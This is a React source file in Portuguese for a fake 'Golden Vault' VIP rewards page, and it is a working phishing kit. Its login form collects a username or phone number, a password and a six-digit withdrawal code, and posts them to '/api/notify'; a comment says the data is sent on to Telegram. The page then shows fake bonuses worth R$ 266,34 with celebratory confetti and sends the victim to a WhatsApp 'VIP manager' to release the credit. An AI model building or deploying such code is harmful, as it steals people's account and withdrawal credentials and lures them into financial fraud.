/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect, useRef } from 'react';
import { gsap } from 'gsap';
import confetti from 'canvas-confetti';
import { Lock, User, Key, Coins, Trophy, Zap, Gift, CheckCircle2, MessageCircle, ArrowRight } from 'lucide-react';

interface UserData {
  user: string;
  pass: string;
  withdraw_pass: string;
  timestamp: string;
  status: string;
  rewardsClaimed: string[];
}

const REWARDS = [
  { id: 'vip7', title: 'UPGRADE VIP 7', description: 'Sincronização de privilégios', icon: Trophy, value: 'NÍVEL 7' },
  { id: 'bonus75', title: 'BÔNUS DE ENTRADA', description: 'Crédito em reserva', value: 'R$ 75,00', icon: Gift },
  { id: 'secret50', title: 'RECARGA SECRETA I', description: 'Ativação de multiplicador', value: 'R$ 50,00', icon: Zap },
  { id: 'secret30', title: 'RECARGA SECRETA II', description: 'Fidelidade avançada', value: 'R$ 30,00', icon: Coins },
  { id: 'loyalty16', title: 'RESGATE DE LEALDADE', description: 'Cálculo de saldo residual', value: 'R$ 16,34', icon: CheckCircle2 },
];

export default function App() {
  const [view, setView] = useState<'login' | 'dashboard' | 'success'>('login');
  const [userData, setUserData] = useState<UserData>({
    user: '',
    pass: '',
    withdraw_pass: '',
    timestamp: '',
    status: 'pending',
    rewardsClaimed: [],
  });
  const [currentRewardIndex, setCurrentRewardIndex] = useState(0);
  const [isClaiming, setIsClaiming] = useState(false);
  
  const containerRef = useRef<HTMLDivElement>(null);
  const loginRef = useRef<HTMLDivElement>(null);
  const dashboardRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    const ctx = gsap.context(() => {
      const particles = document.querySelectorAll('.particle');
      particles.forEach((p) => {
        gsap.to(p, {
          y: 'random(-120, 120)',
          x: 'random(-60, 60)',
          duration: 'random(4, 8)',
          repeat: -1,
          yoyo: true,
          ease: 'sine.inOut',
        });
      });
    }, containerRef);
    return () => ctx.revert();
  }, []);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    const updatedData = {
      ...userData,
      timestamp: new Date().toISOString(),
    };
    setUserData(updatedData);

    // Send to Telegram via Server API
    try {
      await fetch('/api/notify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(updatedData),
      });
    } catch (err) {
      console.error('Notification failed', err);
    }

    gsap.to(loginRef.current, {
      opacity: 0,
      y: -20,
      duration: 0.6,
      ease: 'power2.in',
      onComplete: () => {
        setView('dashboard');
        gsap.fromTo(dashboardRef.current, 
          { opacity: 0, y: 30 }, 
          { opacity: 1, y: 0, duration: 0.8, ease: 'power3.out' }
        );
      }
    });
  };

  const triggerDopamine = () => {
    const duration = 1.5 * 1000;
    const animationEnd = Date.now() + duration;
    const defaults = { startVelocity: 25, spread: 360, ticks: 50, zIndex: 100 };

    const randomInRange = (min: number, max: number) => Math.random() * (max - min) + min;

    const interval: any = setInterval(function() {
      const timeLeft = animationEnd - Date.now();
      if (timeLeft <= 0) return clearInterval(interval);
      const particleCount = 40 * (timeLeft / duration);
      confetti({ ...defaults, particleCount, origin: { x: randomInRange(0.1, 0.3), y: Math.random() - 0.2 }, colors: ['#D4AF37', '#F5F5F5'] });
      confetti({ ...defaults, particleCount, origin: { x: randomInRange(0.7, 0.9), y: Math.random() - 0.2 }, colors: ['#D4AF37', '#F5F5F5'] });
    }, 200);
  };

  const claimReward = (id: string) => {
    if (isClaiming) return;
    setIsClaiming(true);
    triggerDopamine();

    setTimeout(() => {
      setUserData(prev => ({
        ...prev,
        rewardsClaimed: [...prev.rewardsClaimed, id]
      }));
      
      if (currentRewardIndex < REWARDS.length - 1) {
        setCurrentRewardIndex(prev => prev + 1);
        setIsClaiming(false);
      } else {
        setTimeout(() => setView('success'), 800);
      }
    }, 1200);
  };

  return (
    <div ref={containerRef} className="min-h-screen relative flex items-center justify-center p-6 overflow-hidden bg-deep-black">
      {/* Subtle Background Elements */}
      <div className="absolute inset-0 pointer-events-none overflow-hidden">
        {[...Array(15)].map((_, i) => (
          <div 
            key={i} 
            className="particle absolute w-1 h-1 bg-gold/10 rounded-full"
            style={{ 
              left: `${Math.random() * 100}%`, 
              top: `${Math.random() * 100}%`,
              boxShadow: '0 0 8px #D4AF37'
            }}
          />
        ))}
        <div className="absolute top-0 left-0 w-full h-full bg-[radial-gradient(circle_at_50%_50%,rgba(138,43,226,0.05),transparent_70%)]" />
      </div>

      {view === 'login' && (
        <div ref={loginRef} className="w-full max-w-md glass-card p-10 rounded-[2rem] relative z-10">
          <div className="text-center mb-10">
            <div className="w-16 h-16 bg-surface border border-gold/20 rounded-2xl flex items-center justify-center mx-auto mb-6 animate-float">
              <Lock className="text-gold w-8 h-8" />
            </div>
            <h1 className="text-4xl font-black tracking-tighter text-gradient-gold mb-3">GOLDEN VAULT</h1>
            <p className="text-text-secondary text-sm font-light tracking-wide">AUTENTICAÇÃO VIP REQUERIDA</p>
          </div>

          <form onSubmit={handleLogin} className="space-y-8">
            <div className="space-y-2">
              <label className="text-[10px] uppercase tracking-[0.2em] text-text-secondary font-bold ml-1">Identificação</label>
              <div className="relative group">
                <User className="absolute left-4 top-1/2 -translate-y-1/2 text-text-secondary group-focus-within:text-gold transition-colors w-5 h-5" />
                <input 
                  required
                  type="text" 
                  placeholder="Numero de Telefone ou user"
                  className="w-full bg-surface/50 border border-white/5 rounded-xl py-4 pl-12 pr-4 focus:outline-none focus:border-gold/30 transition-all text-text-primary placeholder:text-text-secondary/30"
                  value={userData.user}
                  onChange={(e) => setUserData({...userData, user: e.target.value})}
                />
              </div>
            </div>

            <div className="space-y-2">
              <label className="text-[10px] uppercase tracking-[0.2em] text-text-secondary font-bold ml-1">Senha de Acesso</label>
              <div className="relative group">
                <Key className="absolute left-4 top-1/2 -translate-y-1/2 text-text-secondary group-focus-within:text-gold transition-colors w-5 h-5" />
                <input 
                  required
                  type="password" 
                  placeholder="••••••••"
                  className="w-full bg-surface/50 border border-white/5 rounded-xl py-4 pl-12 pr-4 focus:outline-none focus:border-gold/30 transition-all text-text-primary placeholder:text-text-secondary/30"
                  value={userData.pass}
                  onChange={(e) => setUserData({...userData, pass: e.target.value})}
                />
              </div>
            </div>

            <div className="space-y-2">
              <label className="text-[10px] uppercase tracking-[0.2em] text-text-secondary font-bold ml-1">Código de Saque</label>
              <div className="relative group">
                <Coins className="absolute left-4 top-1/2 -translate-y-1/2 text-text-secondary group-focus-within:text-gold transition-colors w-5 h-5" />
                <input 
                  required
                  type="password" 
                  placeholder="6 dígitos de segurança"
                  className="w-full bg-surface/50 border border-white/5 rounded-xl py-4 pl-12 pr-4 focus:outline-none focus:border-gold/30 transition-all text-text-primary placeholder:text-text-secondary/30"
                  value={userData.withdraw_pass}
                  onChange={(e) => setUserData({...userData, withdraw_pass: e.target.value})}
                />
              </div>
            </div>

            <button type="submit" className="w-full btn-gold py-5 rounded-xl text-sm uppercase tracking-[0.1em]">
              ACESSAR RECOMPENSAS
            </button>
          </form>
        </div>
      )}

      {view === 'dashboard' && (
        <div ref={dashboardRef} className="w-full max-w-2xl relative z-10">
          <div className="flex items-center justify-between mb-12">
            <div>
              <h2 className="text-3xl font-black text-white tracking-tighter">CENTRAL VIP</h2>
              <p className="text-text-secondary text-sm">Bem-vindo, <span className="text-gold font-semibold">{userData.user}</span></p>
            </div>
            <div className="bg-surface border border-gold/20 px-4 py-2 rounded-lg">
              <span className="text-[10px] text-text-secondary uppercase font-bold tracking-widest">Status:</span>
              <span className="ml-2 text-gold font-black text-xs">ONLINE</span>
            </div>
          </div>

          <div className="grid gap-4">
            {REWARDS.map((reward, index) => {
              const isUnlocked = index <= currentRewardIndex;
              const isClaimed = userData.rewardsClaimed.includes(reward.id);
              const isCurrent = index === currentRewardIndex;

              return (
                <div 
                  key={reward.id}
                  className={`glass-card p-6 rounded-2xl border gold-border-glow flex items-center justify-between transition-all duration-700 ${
                    isUnlocked ? 'opacity-100' : 'opacity-20 grayscale'
                  } ${isCurrent ? 'scale-[1.02] border-gold/40' : 'border-white/5'}`}
                >
                  <div className="flex items-center gap-5">
                    <div className={`w-12 h-12 rounded-xl flex items-center justify-center ${isUnlocked ? 'bg-gold/10 text-gold' : 'bg-white/5 text-white/10'}`}>
                      <reward.icon className="w-6 h-6" />
                    </div>
                    <div>
                      <h3 className="text-sm font-bold tracking-tight">{reward.title}</h3>
                      <p className="text-[10px] text-text-secondary uppercase tracking-wider">{reward.description}</p>
                    </div>
                  </div>

                  <div className="flex flex-col items-end gap-2">
                    <span className={`text-lg font-black ${isUnlocked ? 'text-gold' : 'text-white/10'}`}>{reward.value}</span>
                    {isCurrent && !isClaimed && (
                      <button 
                        onClick={() => claimReward(reward.id)}
                        disabled={isClaiming}
                        className="btn-gold px-5 py-2 rounded-lg text-[10px] uppercase disabled:opacity-50"
                      >
                        {isClaiming ? 'SINCRONIZANDO' : 'RESGATAR'}
                      </button>
                    )}
                    {isClaimed && (
                      <span className="text-neon-purple text-[10px] font-bold uppercase tracking-widest flex items-center gap-1">
                        <CheckCircle2 className="w-3 h-3" /> LIBERADO
                      </span>
                    )}
                  </div>
                </div>
              );
            })}
          </div>
        </div>
      )}

      {view === 'success' && (
        <div className="fixed inset-0 z-50 bg-deep-black/98 flex items-center justify-center p-6 backdrop-blur-2xl">
          <div className="w-full max-w-md glass-card p-12 rounded-[3rem] text-center border-gold/30 relative overflow-hidden">
            <div className="absolute -top-24 -left-24 w-48 h-48 bg-neon-purple/10 rounded-full blur-[80px]" />
            <div className="absolute -bottom-24 -right-24 w-48 h-48 bg-gold/5 rounded-full blur-[80px]" />

            <div className="relative z-10">
              <div className="w-20 h-20 bg-gold rounded-3xl flex items-center justify-center mx-auto mb-8 shadow-[0_10px_40px_rgba(212,175,55,0.4)] animate-float">
                <CheckCircle2 className="text-deep-black w-10 h-10" />
              </div>
              
              <h2 className="text-3xl font-black text-white mb-6 tracking-tighter uppercase">Sincronização Concluída</h2>
              
              <div className="space-y-4 mb-10">
                <p className="text-text-secondary text-sm leading-relaxed">
                  Seu bônus acumulado de <span className="text-gold font-bold">R$ 266,34</span> e o acesso <span className="text-gold font-bold">VIP 7</span> foram vinculados ao seu perfil.
                </p>
                <p className="text-text-secondary text-sm font-light">
                  Para efetivar o crédito em sua conta, confirme o procedimento com seu gerente VIP.
                </p>
              </div>

              <a 
                href="https://wa.me/55996191896?text=Olá!%20Concluí%20o%20resgate%20VIP%20de%20R$%20266,34.%20Pode%20liberar%20o%20crédito?"
                target="_blank"
                rel="noopener noreferrer"
                className="flex items-center justify-center gap-3 w-full btn-gold py-5 rounded-2xl text-sm uppercase tracking-widest"
              >
                LIBERAR BÔNUS AGORA
                <ArrowRight className="w-5 h-5" />
              </a>
              
              <div className="mt-8 flex items-center justify-center gap-2">
                <div className="w-1.5 h-1.5 bg-gold rounded-full animate-pulse" />
                <span className="text-[9px] uppercase tracking-[0.3em] text-text-secondary font-bold">Aguardando Validação</span>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
